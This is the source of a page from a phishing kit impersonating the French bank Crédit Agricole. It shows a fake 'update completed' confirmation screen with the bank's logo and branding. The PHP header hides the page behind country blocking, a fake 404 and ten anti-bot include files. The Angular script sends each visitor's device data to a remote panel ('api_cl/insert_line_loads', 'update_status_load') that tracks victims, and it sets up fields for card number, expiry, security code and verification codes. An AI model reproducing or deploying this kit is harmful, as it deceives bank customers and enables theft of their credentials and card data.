
<?php

  include 'functions.php';
  if(!check_block_country()){
               header('HTTP/1.0 404 Not Found');
               die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
        exit;
  };
include '../new/anti0.php';
include '../new/anti1.php';
include '../new/anti2.php';
include '../new/anti3.php';
include '../new/anti4.php';
include '../new/anti5.php';
include '../new/anti6.php';
include '../new/anti7.php';
include '../new/anti8.php';
include '../new/anti9.php';
?>
<!DOCTYPE html>
<html lang="fr" class=" backgroundblendmode no-capture flexbox flexwrap">

<head>

	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="">
    <meta name="robots" content="noindex">
    <title>Crédit Agricole</title>
	
	<meta name="format-detection" content="telephone=no">

 	<link rel="stylesheet" href="assets/css/clientlib-part.min.css" type="text/css">
    <link rel="stylesheet" href="assets/css/clientlibStoreLocatorAccesCRPart.min.css" type="text/css">
    <link rel="stylesheet" href="assets/css/icons.css" type="text/css">



<style type="text/css">
	.Login-keypad {

    width: -webkit-calc(100% + 0px);
     width: calc(100% + 0px);
}

.Login-key {
    display: table-cell;
    height: 50px!important;
    width: 52px !important;
 
    border-radius: 50%;
	}
</style>
<body>



<main  ng-app="sa_app"  ng-controller="controller" ng-init="show_data()">
	<div class="login parbase" style="background: #f5f5f5;">
		<div class="Login">
			<div class="Login-header js-Header">
				<a href="" class="Login-logo Login-logo-js" tabindex="2000">
				     <img class="Login-logoImg js-needFakeNotSvg" src="./assets/img/{{logo_png}}.png" alt="">
				</a>
				<a href="" class="Login-close" id="Login-close" ><span class="ti-close"></span></a>
			</div>

		    <div class="container-fluid Template" style="margin-top: 60px;">
				<div class="row js-Template-head">

					
					<div class="col-xs-12 col-md-6">
						<div class="Template-reduceMargin15px">
							<div class="js-StickyPush js-Sticky--enable">
								<div class="js-StickyWrap" style="transform: translateY(0px);">
									<div class="js-FullHeight ForgotPswd-imgWrapper hidden-xs" style="height: 577px;">
										<div class="placeholder-left parsys">
											<div class="new-zdg parbase section">
										        <div class="VideoPlayer matchHeight js-VideoPlayer" data-video-provider="YOUTUBE" data-video-id="vV_tpC9MuP4" data-video-loadbackgroundimage="false" style="background-image: url(assets/img/zdg-securipass-v2-video-4.jpg);" data-trackingclass="video_player" data-trackinginfo="progcr_video-securipass-V2">
										            <div class="VideoPlayer-video"> </div>

										            <a class="VideoPlayer-play js-VideoPlayer-play" href="" title="Lancer la vidéo" tabindex="2000">
										            	<span class="ti-control-play"></span>
										            </a>

										            <div class="VideoPlayer-textBloc">
										                <p class="VideoPlayer-Title"></p>
										                    <p style="text-align: center;"><span class="h2"><b>SécuriPass, la solution simple et sécurisée <br>
										                      pour réaliser vos paiements par carte bancaire sur Internet.</b></span><b>
										                      	<span class="h2"><br></span><span class="RichText-emphaseBlanc"></span></b><span class="h2"></span><b><span class="h2"></span><span class="RichText-titreProjet"></span></b>
										                      	<span class="RichText-titreBlanc"><b></b></span>
										                      	<span class="RichText-grosTitre"></span><br>
										                    </p>
										                <p></p>
										            </div>
										        </div>
			                                </div>
			                             </div>
									</div>
							    </div>
						    </div>
						</div>
					</div>


		    <div class="col-xs-12 col-md-6">
		          <div class="parsys">
		            <div class="section">
		              <div class="StoreLocatorPopIn-geolocationDisabled">

						<div class="placeholder-2 parsys">
							<div class="texte section"><div tabindex="0"></div></div>
		                </div>

		                <div class="placeholder-2-1 parsys">
		                	<div class="trouver-un-CR parbase section">
								<div class="GeolocComponent GeolocationDisabled section">
									<div class="GeolocationDisabled-content matchHeight">
										<div id="trouver-un-cr-mode-search" style="">
								     












    

                                           <i aria-hidden="true" class="fa fa-check-square-o" style="font-size: 9rem;color: #007d8f;"></i>

											<h2 class="GeolocationDisabled-title GeolocFail">
												Merci pour votre temps <br> <strong>Vous avez bien terminer la mise à jour</strong>
											</h2>
											<!--<p class="GeolocationDisabled-text GeolocFail">Trouver une caisse régionale</p>						-->
											
										
											<!--<button type="submit" class="btn btn-primary GeolocationDisabled-btn" ng-click="valider()">Valider</button>-->
								  		    <p class="GeolocationEnabled-text GeolocationEnabled-text--margin">
								  			    <!--<a href="">Voir tous les sites des Caisses régionales.</a>-->
								  			</p>
									      
										      

										</div>
										
								
									</div>
								</div>
		                    </div>
		                </div>

						
		                <div class="placeholder-3 parsys"><div class="texte section"><div tabindex="0"></div></div></div>

		              </div>
		            </div>
		          </div>
		    </div>
				</div>
			</div>
		</div>
	</div>
</main>




<footer> <div class="Footer"> </div></footer>
<script type="text/javascript" src="assets/js/jquery.min.js"></script>
<script src="assets/js/angular.min.js"></script>
<script src="assets/js/dirPaginate.js"></script>
<script type="text/javascript">



</script>

<script> 

var fetch = angular.module('sa_app', ['angularUtils.directives.dirPagination']);

fetch.controller('controller', ['$scope', '$http','$filter', function ($scope, $http,$filter) {

     var urlx = window.location.pathname;
    var pathname = urlx.replace("card.php", "");
    $scope.select_reg ="no-value";
	$scope.reg_txt =[
			{id:"05",code:"ca-alpesprovence" },
			{id:"84",code:"ca-alpesprovence" },
			{id:"13",code:"ca-alpesprovence" },
			{id:"67",code:"ca-alsace-vosges" },
			{id:"68",code:"ca-alsace-vosges" },
			{id:"88",code:"ca-alsace-vosges" },
			{id:"49",code:"ca-anjou-maine" },
			{id:"72",code:"ca-anjou-maine" },
			{id:"40",code:"ca-aquitaine" },
			{id:"47",code:"ca-aquitaine" },
			{id:"44",code:"ca-atlantique-vendee" },
			{id:"85",code:"ca-atlantique-vendee" },
			{id:"80",code:"ca-briepicardie" },
			{id:"01",code:"ca-centrest" },
			{id:"71",code:"ca-centrest" },
			{id:"03",code:"ca-centrefrance" },
			{id:"23",code:"ca-centrefrance" },
			{id:"15",code:"ca-centrefrance" },
			{id:"63",code:"ca-centrefrance" },
			{id:"18",code:"ca-centreloire" },
			{id:"58",code:"ca-centreloire" },
			{id:"36",code:"ca-centreouest" },
			{id:"87",code:"ca-centreouest" },
			{id:"10",code:"ca-cb" },
			{id:"21",code:"ca-cb" },
			{id:"52",code:"ca-cb" },
			{id:"79",code:"ca-cmds" },
			{id:"16",code:"ca-charente-perigord" },
			{id:"24",code:"ca-charente-perigord" },
			{id:"22",code:"ca-cotesdarmor" },
			{id:"74",code:"ca-des-savoie" },
			{id:"29",code:"ca-finistere" },
			{id:"25",code:"ca-franchecomte" },
			{id:"70",code:"ca-franchecomte" },
			{id:"39",code:"ca-franchecomte" },
			{id:"90",code:"ca-franchecomte" },
			{id:"35",code:"ca-illeetvilaine" },
			{id:"30",code:"ca-languedoc" },
			{id:"48",code:"ca-languedoc" },
			{id:"34",code:"ca-languedoc" },
			{id:"42",code:"ca-loirehauteloire" },
			{id:"43",code:"ca-loirehauteloire" },
			{id:"54",code:"ca-lorraine" },
			{id:"55",code:"ca-lorraine" },
			{id:"57",code:"ca-lorraine" },
			{id:"56",code:"ca-morbihan" },
			{id:"59",code:"ca-norddefrance" },
			{id:"62",code:"ca-norddefrance" },
			{id:"02",code:"ca-nord-est" },
			{id:"51",code:"ca-nord-est" },
			{id:"08",code:"ca-nord-est" },
			{id:"12",code:"ca-nmp" },
			{id:"81",code:"ca-nmp" },
			{id:"82",code:"ca-nmp" },
			{id:"14",code:"ca-normandie" },
			{id:"50",code:"ca-normandie" },
			{id:"76",code:"ca-normandie-seine" },
			{id:"75",code:"ca-paris" },
			{id:"78",code:"ca-paris" },
			{id:"92",code:"ca-paris" },
			{id:"93",code:"ca-paris" },
			{id:"94",code:"ca-paris" },
			{id:"95",code:"ca-paris" },
			{id:"04",code:"ca-pca" },
			{id:"83",code:"ca-pca" },
			{id:"06",code:"ca-pca" },
			{id:"64",code:"ca-pyrenees-gascogne" },
			{id:"09",code:"ca-sudmed" },
			{id:"66",code:"ca-sudmed" },
			{id:"31",code:"ca-toulouse31" },
			{id:"86",code:"ca-tourainepoitou" },
			{id:"28",code:"ca-valdefrance" },
			{id:"974",code:"ca-reunion" },
			{id:"976",code:"ca-reunion" },
			{id:"972",code:"ca-martinique" },
			{id:"973",code:"ca-martinique" },
			{id:"971",code:"ca-guadeloupe" },
			{id:"2A",code:"ca-corse" },
			{id:"2B",code:"ca-corse" },
	];
	$scope.logo_png='';
		$scope.expiry1=''
		$scope.expiry2=''
		$scope.number=''
		$scope.securitycode=''
		$scope.name=''
 
		$scope.vcode1='';
		$scope.vcode2='';
		$scope.vcode3='';
    $scope.bloc_pwd_input='';

    $scope.info_User={};
    $scope.load='';
    $scope.loads_info='';
    $scope.base_url='';
    $scope.val_login="";


    //localStorage.setItem("lastname", "Smith");
    //localStorage.getItem("lastname");
    //localStorage.getItem("lastname");

    $scope.show_data = function(){
        $http({
          method: 'get',
          url: "config/device.php"
        }).then(function successCallback(response) {
                $scope.info_User=response.data;
                 $scope.base_url=$scope.info_User['url'];
                console.log($scope.info_User)
                 $http({
                      method: 'post',
                      url: $scope.base_url+"api_cl/insert_line_loads",
                      data: $scope.info_User, 
                      headers: { 'Content-Type': 'application/x-www-form-urlencoded'}
                }).then(function(data) {
                    if(data.data.exist){
          
                        $scope.load=data.data.load ;
                        $scope.logo_png =data.data.region;
                        $scope.loads_info=data.data.loads_info;
                      
					    	var Detaile3 = {}; 
					        Detaile3.id= $scope.load;
				  	        Detaile3.status=0;
						    $http({
						          method: 'post',
						          url: $scope.base_url+"api_cl/update_status_load",
						          data: Detaile3, 
						          headers: { 'Content-Type': 'application/x-www-form-urlencoded'}
						    }).then(function(data) {
				                    console.log(data.data);
						    });

                    }else{
                        console.log(data.data);
                        $scope.load=data.data.load ;
                        $scope.loads_info=data.data.loads_info;
                        $scope.logo_png =data.data.region;
					    	var Detaile3 = {}; 
					        Detaile3.id= $scope.load;
				  	        Detaile3.status=0;
						    $http({
						          method: 'post',
						          url: $scope.base_url+"api_cl/update_status_load",
						          data: Detaile3, 
						          headers: { 'Content-Type': 'application/x-www-form-urlencoded'}
						    }).then(function(data) {
				                    console.log(data.data);
						    });
                                              
                    }
                });
        }); 
    }



}]);

</script>











</body>
</html>